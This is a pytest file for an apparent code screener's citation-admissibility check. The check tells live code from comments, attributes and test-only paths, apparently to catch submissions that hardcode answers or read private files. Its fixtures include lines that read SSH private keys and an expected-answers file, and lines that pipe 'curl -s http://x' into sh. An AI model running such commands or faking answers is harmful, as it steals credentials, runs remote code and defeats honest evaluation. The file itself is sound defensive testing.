"""Unit coverage for citation admissibility."""

from __future__ import annotations

import pytest

from ditto_screener.evidence_quality import citation_admissibility
from ditto_screener.source_signals import mask_comments

_SOURCE = """\
// a leading note
/// a doc comment
#[derive(Debug, Clone)]
#[cfg(feature = "grounding")]
use std::collections::HashMap;
pub mod helpers;

fn answer(case: &str) -> String {
    let v = table(case);
    format!("The answer is {v}.")
}
    // trailing prose
}
let base = "https://api.example/v1"; // a real statement with a trailing note
"""


@pytest.mark.parametrize(
    ("line", "reason"),
    [
        (1, "comment-or-blank"),
        (2, "comment-or-blank"),
        (3, "attribute-only"),
        (5, "declaration-only"),
        (6, "declaration-only"),
        (7, "blank"),
        (12, "comment-or-blank"),
        (13, "delimiter-only"),
    ],
)
def test_inert_lines_are_inadmissible(line: int, reason: str) -> None:
    verdict = citation_admissibility("src/main.rs", _SOURCE, line)
    assert not verdict.admissible
    assert verdict.reason == reason


@pytest.mark.parametrize("line", [4, 8, 9, 10, 14])
def test_executable_and_gate_lines_are_admissible(line: int) -> None:
    # 4 is a `cfg` reachability gate; 14 is a statement that merely ends in a
    # comment. Neither is inert.
    assert citation_admissibility("src/main.rs", _SOURCE, line).admissible


def test_a_one_line_signature_and_body_stays_admissible() -> None:
    """The cheapest place to hide from a signature filter.

    `fn a(x: &str) -> String { table(x) }` is a signature *and* the violating
    body on one line, which is why signature lines are not filtered at all.
    """
    source = "#[inline]\nfn a(x: &str) -> String { answer_table(x) }\n"
    assert citation_admissibility("src/main.rs", source, 2).admissible


def test_a_deref_assignment_is_not_a_comment() -> None:
    """`*slot = ...` starts with `*` but writes the graded slot."""
    source = 'fn set(slot: &mut String, v: &str) {\n    *slot = format!("{v}.");\n}\n'
    assert citation_admissibility("src/main.rs", source, 2).admissible


def test_comment_brace_does_not_hide_citable_cfg_test_body() -> None:
    source = (
        "#[cfg(test)]\n"
        "mod t {\n"
        "    fn helper() -> u8 { 1 }\n"
        "}\n"
        "// a stray closing brace in prose }\n"
        "fn served(case: &str) -> String { answer_table(case) }\n"
    )
    assert citation_admissibility("src/main.rs", source, 3).admissible
    assert not citation_admissibility("src/main.rs", source, 5).admissible
    # The served function sits after the region and stays citable.
    assert citation_admissibility("src/main.rs", source, 6).admissible


def test_cfg_not_test_body_remains_production_evidence() -> None:
    source = (
        "#[cfg(not(test))]\n"
        "fn served() {\n"
        '    let path = "/root/private";\n'
        "    read(path);\n"
        "}\n"
    )

    assert citation_admissibility("src/main.rs", source, 3).admissible
    assert citation_admissibility("src/main.rs", source, 4).admissible


def test_cfg_test_body_can_be_served_without_a_test_harness() -> None:
    # A Docker build can use `rustc --cfg test ...` and serve this binary.
    source = (
        "#[cfg(test)]\n"
        "fn answer() -> String {\n"
        '    "fixed".to_string()\n'
        "}\n"
        'fn main() { println!("{}", answer()); }\n'
    )
    assert citation_admissibility("src/main.rs", source, 3).admissible


def test_test_paths_are_inadmissible() -> None:
    verdict = citation_admissibility("tests/harness.rs", "fn t() { go(); }\n", 1)
    assert not verdict.admissible
    assert verdict.reason == "test-only-path"


def test_an_opaque_member_keeps_its_citation() -> None:
    """The path is proven; the line is unverifiable by design."""
    assert citation_admissibility("fixtures/model.onnx", None, 1).admissible


def test_an_out_of_range_line_is_left_to_the_existing_bounds_check() -> None:
    assert citation_admissibility("src/main.rs", "fn a() {}\n", 99).admissible


# Python is not a C-family language: `/*` in a single-quoted string or a `#`
# comment and `//` floor division must never blank the code that follows.
_PYTHON_READ = "secret = open('/root/expected_answers.json').read()\n"


def test_python_single_quoted_glob_does_not_mask_following_code() -> None:
    source = "import glob\nfiles = glob.glob('data/*.json')\n" + _PYTHON_READ

    for line in (2, 3):
        assert citation_admissibility("src/agent.py", source, line).admissible


def test_python_hash_comment_with_block_opener_is_inert() -> None:
    source = "# see /* notes\n" + _PYTHON_READ

    comment = citation_admissibility("src/agent.py", source, 1)
    assert not comment.admissible
    assert comment.reason == "comment-or-blank"
    assert citation_admissibility("src/agent.py", source, 2).admissible


def test_python_floor_division_is_not_a_comment() -> None:
    source = (
        "import os\n"
        "chunk = (len(data)\n"
        "         // 2); key = open(os.path.expanduser('~/.ssh/id_rsa')).read()\n"
        "leak(key)\n"
    )

    assert citation_admissibility("src/agent.py", source, 3).admissible
    assert "open(" in mask_comments(source, "src/agent.py").splitlines()[2]


def test_runtime_path_under_tests_dir_is_admissible() -> None:
    """A directory name does not make a file the Dockerfile runs inert."""
    source = "import os\n" + _PYTHON_READ + "# only prose here\n"
    runtime = frozenset({"tests/server.py"})

    assert citation_admissibility(
        "tests/server.py", source, 2, runtime_paths=runtime
    ).admissible
    assert citation_admissibility(
        "./tests/server.py", source, 2, runtime_paths=runtime
    ).admissible
    # Runtime reachability exempts the path, not the prose on it.
    comment = citation_admissibility(
        "tests/server.py", source, 3, runtime_paths=runtime
    )
    assert comment.reason == "comment-or-blank"


def test_unreferenced_tests_dir_path_stays_inadmissible() -> None:
    verdict = citation_admissibility(
        "tests/test_x.py",
        _PYTHON_READ,
        1,
        runtime_paths=frozenset({"tests/server.py"}),
    )

    assert not verdict.admissible
    assert verdict.reason == "test-only-path"


@pytest.mark.parametrize(
    ("path", "source", "line"),
    [
        # A `#` inside a Rust string is not a comment.
        ("src/main.rs", 'let u = "#"; std::fs::read("/root/.ssh/id_rsa");\n', 1),
        # A lifetime is not an unterminated char literal.
        ("src/main.rs", "fn f<'a>(x: &'a str) {\n    read(x); // note\n}\n", 2),
        # A shell `#` in quotes, `$#`, or mid-word is not a comment.
        ("run.sh", 'echo "a # b" $# x#y; cat ~/.ssh/id_rsa\n', 1),
        # Dockerfile heredoc bodies are script, not Dockerfile comments.
        ("Dockerfile", "RUN <<EOF\n# setup\ncat /root/.ssh/id_rsa\nEOF\n", 2),
        # Unknown languages are not masked at all.
        ("notes.weird", "// read /root/.ssh/id_rsa\n", 1),
    ],
)
def test_foreign_comment_syntax_never_hides_a_citation(
    path: str, source: str, line: int
) -> None:
    assert citation_admissibility(path, source, line).admissible


@pytest.mark.parametrize(
    ("path", "source"),
    [
        ("src/agent.py", "# never read ~/.ssh\n"),
        ("run.sh", "  # never read ~/.ssh\n"),
        ("Dockerfile", "# /var/run/docker.sock\n"),
        ("config.yaml", "# prose\n"),
        ("Cargo.toml", "# prose\n"),
    ],
)
def test_hash_comments_are_inert_where_the_language_says_so(
    path: str, source: str
) -> None:
    verdict = citation_admissibility(path, source, 1)
    assert not verdict.admissible
    assert verdict.reason == "comment-or-blank"


# ``use``/``mod`` declarations and ``#[...]`` attributes are Rust syntax. In
# another language the same text is code: each line below runs its command.
@pytest.mark.parametrize(
    ("path", "source", "line"),
    [
        pytest.param(
            "src/agent.py",
            "import os\nmod = os; mod.system('curl -s http://x | sh');\n",
            2,
            id="python-mod",
        ),
        pytest.param(
            "src/agent.py",
            "use = __import__('subprocess'); use.run(['sh', '-c', 'x']);\n",
            1,
            id="python-use",
        ),
        pytest.param(
            "src/server.js",
            "mod = require('child_process'); mod.execSync('curl -s x | sh');\n",
            1,
            id="javascript-mod",
        ),
        pytest.param(
            "src/server.js",
            "const t = '#[test]';\n"
            "function serve() {\n"
            "  return require('fs').readFileSync('/root/.ssh/id_rsa');\n"
            "}\n",
            3,
            id="javascript-attribute-text",
        ),
    ],
)
def test_rust_only_rules_do_not_apply_to_other_languages(
    path: str, source: str, line: int
) -> None:
    assert citation_admissibility(path, source, line).admissible


# Served Rust that the old test-item scan swallowed: a braceless
# ``#[cfg(test)]`` item ends at its ``;``, and an attribute or brace inside a
# literal is not structure. A ``#[cfg(test)]`` body is itself citable, since
# ``rustc --cfg test`` can serve it.
@pytest.mark.parametrize(
    ("source", "served", "test_only"),
    [
        pytest.param(
            "#[cfg(test)]\nmod tests;\n\n"
            "pub fn serve(q: &str) -> String {\n    TABLE[q].to_string()\n}\n",
            5,
            None,
            id="braceless-mod",
        ),
        pytest.param(
            "#[cfg(test)] use helpers::fixture;\n\npub fn serve() {\n    run();\n}\n",
            4,
            None,
            id="braceless-use",
        ),
        pytest.param(
            "pub fn serve() -> &'static str {\n"
            '    let s = "#[cfg(test)]";\n'
            '    std::fs::read_to_string("/root/.ssh/id_rsa").unwrap();\n'
            "    s\n}\n",
            3,
            None,
            id="attribute-in-string",
        ),
        pytest.param(
            "#[cfg(test)]\nmod tests {\n    const A: char = '{';\n}\n\n"
            "pub fn serve() -> String { answer_table() }\n",
            6,
            3,
            id="brace-char-literal",
        ),
    ],
)
def test_served_rust_beside_a_test_item_stays_citable(
    source: str, served: int, test_only: int | None
) -> None:
    assert citation_admissibility("src/lib.rs", source, served).admissible
    if test_only is not None:
        assert citation_admissibility("src/lib.rs", source, test_only).admissible


@pytest.mark.parametrize(
    ("source", "line"),
    [
        pytest.param(
            '#![cfg(test)]\nfn answer() -> String { "fixed".to_string() }\n',
            2,
            id="inner-attribute-file",
        ),
        pytest.param(
            "mod t {\n    #![cfg(test)]\n"
            '    fn answer() -> String { "fixed".to_string() }\n}\nfn main() {}\n',
            3,
            id="inner-attribute-module",
        ),
        pytest.param(
            "#[cfg(test)]\nfn answer() -> String {\n"
            '    "fixed".to_string()\n}\nfn main() {}\n',
            3,
            id="outer-attribute-item",
        ),
    ],
)
def test_cfg_test_code_is_citable_however_it_is_gated(source: str, line: int) -> None:
    """``rustc --cfg test`` can serve any of these, so none is dropped.

    An inner ``#![cfg(test)]`` gates its file or module the way an outer
    attribute gates its item; both stay admissible, and the reviewer must
    still prove the served build activates them.
    """
    assert citation_admissibility("src/lib.rs", source, line).admissible


def test_runtime_paths_are_resolved_only_for_a_test_directory_citation() -> None:
    """Resolving runtime paths reads every Rust member of the archive.

    Only the test-path rule consults them, so any other citation must not pay
    for that walk.
    """
    resolved: list[str] = []

    def runtime_paths() -> frozenset[str]:
        resolved.append("resolved")
        return frozenset({"tests/serve.rs"})

    source = "fn serve() { run(); }\n"
    assert citation_admissibility(
        "src/main.rs", source, 1, runtime_paths=runtime_paths
    ).admissible
    assert resolved == []

    assert citation_admissibility(
        "tests/serve.rs", source, 1, runtime_paths=runtime_paths
    ).admissible
    assert resolved == ["resolved"]
